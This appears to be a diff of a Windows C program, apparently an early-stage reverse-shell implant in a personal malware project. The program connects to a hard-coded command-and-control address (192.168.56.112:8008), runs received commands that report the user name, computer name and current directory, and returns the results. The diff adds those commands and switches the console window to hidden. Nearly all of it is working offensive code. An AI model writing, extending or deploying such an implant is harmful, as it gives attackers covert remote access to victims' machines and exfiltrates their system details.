@@ -1,94 +1,109 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
-//#include <tchar.h>
+#pragma comment(lib, "Ws2_32.lib")
+#include <stdio.h>
 
-//#include <stdio.h>
-
-// DEBUG, TEMP.
-//#include <iostream>
-
-
-void whoami(char *returnval, int returnsize)
+void whoami(char* returnval)
 {
 	DWORD bufferlen = 257;
 	// Call WINAPI method, assign it's response to returnval pointer.
-	LPSTR ami;
-	GetUserName(ami, &bufferlen);
-	returnval = ami;
+	GetUserName(returnval, &bufferlen);
 }
-
+void hostname(char* returnval)
+{
+	DWORD bufferlen = 257;
+	GetComputerName(returnval,&bufferlen);
+}
+void pwd(char* returnval)
+{
+	TCHAR tempvar[MAX_PATH];
+	GetCurrentDirectory(MAX_PATH,tempvar); //returns necessary value into tempvar
+	strcat(returnval,tempvar); //you need to put that value into returnval
+}
 void RevShell()
 {
 	// WSADATA object - contains details of application state regarding to network
 	WSADATA wsaver;
-
 	// Version comparison - whether compiled version of sockets is compatible with the older versions
 	WSAStartup(MAKEWORD(2,2), &wsaver);
 
-
 	SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 	sockaddr_in addr;
-
 	addr.sin_family = AF_INET;
-	//InetPton(AF_INET, _TEXT("192.168.56.112"), &addr.sin_addr.s_addr);
 	addr.sin_addr.s_addr = inet_addr("192.168.56.112");
 	addr.sin_port = htons(8008);
-
+	// This if statement triggers if connection to C&C errored out.
 	if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
-		////std::cout << "[-] Error during connection..\n";
 		closesocket(tcpsock);
 		WSACleanup();
 		exit(0);
 	}
+	// Else connection successfull..
 	else {
-		//std::cout << "[+] Connected..\n" << //std::endl;
 		
 		char CommandReceived[1024] = "";
+		// Waiting for incoming connection..
 		while (true) {
 			int Result = recv(tcpsock, CommandReceived, 1024, 0);
-			//std::cout << "Command Received: " << CommandReceived;
-			//std::cout << "Length of Command: " << Result << //std::endl;
+
 			
+			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
 			if (strcmp(CommandReceived, "whoami\n") == 0) {
-				char buffer[257] = "";
-				whoami(buffer,257);
-				strcat(buffer, "\n");
-				send(tcpsock, buffer, strlen(buffer)+1,0);
+				char buffer[257] = ""; // reserve buffer with length of 257 bytes
+				whoami(buffer); // call whoami function
+				strcat(buffer, "\n"); 
+				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
+				// clear buffers
 				memset(buffer, 0, sizeof(buffer));
 				memset(CommandReceived, 0, sizeof(CommandReceived));
 			}
+			// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
 			else if (strcmp(CommandReceived, "pwd\n") == 0) {
-				//std::cout << "Command parsed: pwd" << //std::endl;
+				char buffer[257] = "";
+				pwd(buffer);
+				strcat(buffer, "\n"); 
+				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
+				// clear buffers
+				memset(buffer, 0, sizeof(buffer));
+				memset(CommandReceived, 0, sizeof(CommandReceived));
+			}
+			else if (strcmp(CommandReceived, "hostname\n") == 0) {
+				char buffer[257] = "";
+				hostname(buffer);
+				strcat(buffer, "\n"); 
+				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
+				// clear buffers
+				memset(buffer, 0, sizeof(buffer));
+				memset(CommandReceived, 0, sizeof(CommandReceived));
 			}
 			else if (strcmp(CommandReceived, "exit\n") == 0) {
-				//std::cout << "Command parsed: exit" << //std::endl;
+
+				Sleep(1000);
+				exit(0);
 			}
 			else {
-				//std::cout << "Command not parsed!" << //std::endl;
+				char buffer[20] = "Invalid command\n";
+				send(tcpsock,buffer,strlen(buffer)+1,0);
+				memset(buffer, 0, sizeof(buffer));
+				memset(CommandReceived, 0, sizeof(CommandReceived));
 			}
-			
-			
 			memset(CommandReceived, 0, sizeof(CommandReceived));
 		}		
-		//std::cin.get();
 	}
 	closesocket(tcpsock);
 	WSACleanup();
 	exit(0);
 }
-
 int main()
 {
 	// Window handle to work with Console window;
 	HWND stealth;
 	AllocConsole();
-
-	// Idea of searching window and saying to show it (SW_HIDE to hide)
+	// Idea of searching window and saying to show (SW_SHOWNORMAL) | (SW_HIDE to hide)
 	stealth = FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(stealth, SW_SHOWNORMAL);
+	ShowWindow(stealth, SW_HIDE);
 
-	//std::cout << "Work in progres..\n";
 	RevShell();
 	return 0;
 }
